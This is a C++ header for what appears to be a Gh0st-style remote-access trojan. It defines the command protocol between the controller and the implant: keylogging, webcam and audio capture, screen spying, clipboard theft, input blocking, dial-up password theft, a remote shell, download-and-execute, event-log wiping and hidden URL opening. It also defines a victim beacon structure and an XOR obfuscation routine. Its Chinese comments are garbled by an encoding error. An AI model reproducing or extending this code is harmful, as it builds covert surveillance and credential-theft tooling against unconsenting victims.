#pragma once

#include <string>
#include <vector>
#include <time.h>

#ifndef _MAX_PATH
#define _MAX_PATH 260
#endif

// ����2��������ȫ��Ψһ�����������ɷ���ʱ�������

#define FLAG_FINDEN 0x1234567

#define FLAG_GHOST	0x7654321

// �����������Է����仯ʱ��Ӧ�ø������ֵ���Ա�Ա��س����������
#define DLL_VERSION __DATE__		// DLL�汾

#define TALK_DLG_MAXLEN 1024		// ��������ַ�����

// ����ö���б�
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������

	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x00,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�

	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_KEYBOARD_OFFLINE,		// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����

	COMMAND_AUDIO,					// ��������

	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_DIALUPASS,				// ��������
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_CLEAN_EVENT,			// �������� - ���ϵͳ��־
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_RENAME_REMARK,			// ��������ע
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������
	COMMAND_SERVICES,				// �������
	COMMAND_REGEDIT,
	COMMAND_TALK,					// ��ʱ��Ϣ��֤
	COMMAND_UPDATE = 53,			// �ͻ�������

	// ����˷����ı�ʶ
	TOKEN_AUTH = 100,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN,					// ���߰�
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_EXCEPTION,				// ���������쳣

	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������

	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������

	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������

	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������

	TOKEN_PSLIST,					// �����б�
	TOKEN_WSLIST,					// �����б�
	TOKEN_DIALUPASS,				// ��������
	TOKEN_SHELL_START,				// Զ���ն˿�ʼ
	TOKEN_SERVERLIST,               // �����б�
	COMMAND_SERVICELIST,            // ˢ�·����б�        
	COMMAND_SERVICECONFIG,          // ����˷����ı�ʶ
	TOKEN_TALK_START,				// ��ʱ��Ϣ��ʼ
	TOKEN_TALKCMPLT,				// ��ʱ��Ϣ���ط�
	TOKEN_KEYFRAME,					// �ؼ�֡
	TOKEN_REGEDIT = 200,            // ע���
	COMMAND_REG_FIND,				// ע��� �����ʶ
	TOKEN_REG_KEY,
	TOKEN_REG_PATH,
	COMMAND_BYE,					// ���ض��˳�
	SERVER_EXIT,					// ���ض��˳�
};

#define CLIENT_TYPE_DLL			0	// �ͻ��˴�����DLL����
#define CLIENT_TYPE_ONE			1	// �ͻ��˴����Ե���EXE����
#define CLIENT_TYPE_MODULE		2	// DLL�����ⲿ�������

// �����ӵ����س�����Ϣ
typedef struct CONNECT_ADDRESS
{
public:
	unsigned long	dwFlag;
	char			szServerIP[_MAX_PATH];
	int				iPort;
	int				iType;

public:
	void SetType(int typ) {
		iType = typ;
	}
	const unsigned long & Flag() const {
		return dwFlag;
	}
	const char* ServerIP()const {
		return szServerIP;
	}
	int ServerPort()const {
		return iPort;
	}
	int ClientType()const {
		return iType;
	}
	void SetServer(const char* ip, int port) {
		strcpy_s(szServerIP, ip);
		iPort = port;
	}
	bool IsValid()const {
		return strlen(szServerIP) != 0 && iPort > 0;
	}
} CONNECT_ADDRESS ;

// �������ߺ��͵ļ������Ϣ
// �˽ṹ��һ�������仯�������С��������ǰ�汾�Ŀͻ����޷������°�����.
// �°�ͻ���Ҳ�޷������ϰ汾�����س���.
// Ϊ�ˣ���20241228�ύ������Ϊ����ṹ��Ԥ���ֶΣ��Ա�δ��֮��ʱ֮��
// �������޸Ĵ˽ṹ�壬������������ټ�����ǰ�ĳ�����ߵ�����д����������
typedef struct  LOGIN_INFOR
{
	unsigned char			bToken;									// 1.��½��Ϣ
	char					OsVerInfoEx[156];						// 2.�汾��Ϣ
	unsigned long			dwCPUMHz;								// 3.CPU��Ƶ
	char					moduleVersion[24];						// 4.DLLģ��汾
	char					szPCName[_MAX_PATH];					// 5.������
	int						bWebCamIsExist;							// 6.�Ƿ�������ͷ
	unsigned long			dwSpeed;								// 7.����
	char					szStartTime[20];						// 8.����ʱ��
	char					szReserved[512];						// 9.�����ֶ�

	LOGIN_INFOR(){
		memset(this, 0, sizeof(LOGIN_INFOR));
		strcpy_s(moduleVersion, DLL_VERSION);
	}
}LOGIN_INFOR;

inline void xor_encrypt_decrypt(unsigned char *data, int len, const std::vector<char>& keys) {
	for (char key : keys) {
		for (int i = 0; i < len; ++i) {
			data[i] ^= key;
		}
	}
}

#ifdef _DEBUG
// Ϊ�˽��Զ��������Ļ�������������ĺ꣬������ʱʹ�ã���ʽ�汾û��
#define SCREENYSPY_IMPROVE 0
#define SCREENSPY_WRITE 0
#endif

// ���ڴ��е�λͼд���ļ�
inline bool WriteBitmap(LPBITMAPINFO bmpInfo, const void* bmpData, const std::string& filePrefix, int index = -1) {
	char path[_MAX_PATH];
	if (filePrefix.size() >= 4 && filePrefix.substr(filePrefix.size() - 4) == ".bmp") {
		strcpy_s(path, filePrefix.c_str());
	}
	else {
		sprintf_s(path, ".\\bmp\\%s_%d.bmp", filePrefix.c_str(), index == -1 ? clock() : index);
	}
	FILE* File = fopen(path, "wb");
	if (File) {
		BITMAPFILEHEADER fileHeader = { 0 };
		fileHeader.bfType = 0x4D42; // "BM"
		fileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfo->bmiHeader.biSizeImage;
		fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

		fwrite(&fileHeader, 1, sizeof(BITMAPFILEHEADER), File);
		fwrite(&bmpInfo->bmiHeader, 1, sizeof(BITMAPINFOHEADER), File);
		fwrite(bmpData, 1, bmpInfo->bmiHeader.biSizeImage, File);
		fclose(File);
		return true;
	}
	return false;
}
